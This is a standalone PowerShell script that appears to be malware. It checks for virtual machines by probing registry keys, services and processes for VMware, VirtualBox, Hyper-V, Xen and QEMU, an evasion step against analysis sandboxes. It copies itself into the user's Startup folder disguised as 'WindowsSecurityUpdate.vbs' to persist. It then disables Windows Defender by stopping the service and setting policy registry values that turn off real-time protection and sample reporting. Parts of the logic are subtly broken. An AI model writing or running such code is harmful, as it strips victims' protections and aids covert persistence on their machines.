$ErrorActionPreference = "SilentlyContinue"

$ScriptPath = $MyInvocation.MyCommand.Path
$ExePath = (Get-Process -Id $PID).Path
$FullPath = if ($ScriptPath) { $ScriptPath } else { $ExePath }

function Test-ProcessExists {
    param (
        [string[]]$Processes
    )
    foreach ($proc in $Processes) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
            return $true
        }
    }
    return $false
}

function Test-ServiceExists {
    param (
        [string[]]$Services
    )
    foreach ($service in $Services) {
        if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
            return $true
        }
    }
    return $false
}

function Test-RegistryKeyExists {
    param (
        [string[]]$Keys
    )
    foreach ($key in $Keys) {
        if (Test-Path "Registry::$key") {
            return $true
        }
    }
    return $false
}

function Test-RegistryValueMatch {
    param (
        [string]$Key,
        [string]$ValueName,
        [string]$Pattern
    )
    try {
        $value = Get-ItemProperty -Path "Registry::$Key" -Name $ValueName -ErrorAction Stop
        if ($value.$ValueName -match $Pattern) {
            return $true
        }
    } catch {
        return $false
    }
    return $false
}

function Get-RegistryValueString {
    param (
        [string]$Key,
        [string]$ValueName
    )
    try {
        $value = Get-ItemProperty -Path "Registry::$Key" -Name $ValueName -ErrorAction Stop
        return $value.$ValueName
    } catch {
        return $null
    }
}

function Test-Parallels {
    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    $videoBiosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
    if ($biosVersion -match "parallels" -or $videoBiosVersion -match "parallels") {
        return $true
    }
    return $false
}

function Test-HyperV {
    $physicalHost = Get-RegistryValueString -Key "HKLM\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters" -ValueName "PhysicalHostNameFullyQualified"
    if ($physicalHost) {
        Write-Host "This is a Hyper-V Virtual Machine running on physical host $physicalHost"
        return $true
    }

    $sfmsvals = Get-ChildItem "Registry::HKLM\SOFTWARE\Microsoft" -Name
    if ($sfmsvals -contains "Hyper-V" -or $sfmsvals -contains "VirtualMachine") {
        return $true
    }

    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    if ($biosVersion -match "vrtual" -or $biosVersion -eq "Hyper-V") {
        return $true
    }

    if (Test-RegistryKeyExists -Keys $keys) {
        return $true
    }

    $hypervServices = @("vmicexchange")
    if (Test-ServiceExists -Services $hypervServices) {
        return $true
    }

    return $false
}

function Test-VMware {
    $vmwareServices = @("vmdebug", "vmmouse", "VMTools", "VMMEMCTL", "tpautoconnsvc", "tpvcgateway", "vmware", "wmci", "vmx86")

    if (Test-ServiceExists -Services $vmwareServices) {
        return $true
    }

    $systemManufacturer = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemManufacturer"
    if ($systemManufacturer -match "vmware") {
        return $true
    }

    $scsiPort1 = Get-RegistryValueString -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 1\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier"
    if ($scsiPort1 -match "vmware") {
        return $true
    }

    if (Test-RegistryValueMatch -Key "HKLM\SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000" -ValueName "DriverDesc" -Pattern "cl_vmx_svga|VMWare") {
        return $true
    }

    $vmwareProcs = @("vmtoolsd", "vmwareservice", "vmwaretray", "vmwareuser")

    if (Test-ProcessExists -Processes $vmwareProcs) {
        return $true
    }

    return $false
}

function Test-VirtualBox {
    $vboxProcs = @("vboxservice", "vboxtray")
    $vboxServices = @("VBoxMouse", "VBoxGuest", "VBoxService", "VBoxSF", "VBoxVideo")

    if (Test-ServiceExists -Services $vboxServices -or Test-ProcessExists -Processes $vboxProcs) {
        return $true
    }

    $keys = @("HKLM\HARDWARE\ACPI\DSDT\VBOX__")
    if (Test-RegistryKeyExists -Keys $keys) {
        return $true
    }

    for ($i = 0; $i -le 2; $i++) {
        if (Test-RegistryValueMatch -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port $i\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier" -Pattern "vbox") {
            return $true
        }
    }

    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    $videoBiosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
    if ($biosVersion -match "vbox" -or $videoBiosVersion -match "virtualbox") {
        return $true
    }

    $systemProductName = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemProductName"
    if ($systemProductName -match "virtualbox") {
        return $true
    }

    return $false
}

function Test-Xen {
    $xenProcs = @("xenservice")
    $xenServices = @("xenevtchn", "xennet", "xennet6", "xensvc", "xenvdb")

    if (Test-ProcessExists -Processes $xenProcs -or Test-ServiceExists -Services $xenServices) {
        return $true
    }

    $keys = @("HKLM\HARDWARE\ACPI\DSDT\Xen")
    if (Test-RegistryKeyExists -Keys $keys) {
        return $true
    }

    $systemProductName = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemProductName"
    if ($systemProductName -match "xen") {
        return $true
    }

    return $false
}

function Test-QEMU {
    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    $videoBiosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
    if ($biosVersion -match "qemu" -or $videoBiosVersion -match "qemu") {
        return $true
    }

    $scsiPort0 = Get-RegistryValueString -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier"
    $systemManufacturer = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemManufacturer"
    if ($scsiPort0 -match "qemu|virtio" -or $systemManufacturer -match "qemu") {
        return $true
    }

    if (Test-RegistryValueMatch -Key "HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0" -ValueName "ProcessorNameString" -Pattern "qemu") {
        return $true
    }

    $keys = @("HKLM\HARDWARE\ACPI\DSDT\BOCHS_")
    if (Test-RegistryKeyExists -Keys $keys) {
        return $true
    }

    return $false
}

function Invoke-DetectVirtualMachine {
    if (Test-Parallels) {
        return $false
    }
    if (Test-VMware -or Test-VirtualBox -or Test-HyperV -or Test-Xen -or Test-QEMU) {
        return $true
    }
    return $false
}

function SelfReplicate {
    $DestPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $TargetPath = Join-Path $DestPath "WindowsSecurityUpdate.vbs"
    if (-not (Test-Path $TargetPath)) {
        Copy-Item -Path $FullPath -Destination $TargetPath
    }
}

Set-MpPreference -DisableRealtimeMonitoring $true
Remove-MpPreference -ExclusionPath $env:SystemRoot
Remove-MpPreference -ExclusionPath $env:SystemDrive
Stop-Service -Force windefend
reg add "HKCU\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\Windows Defender\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
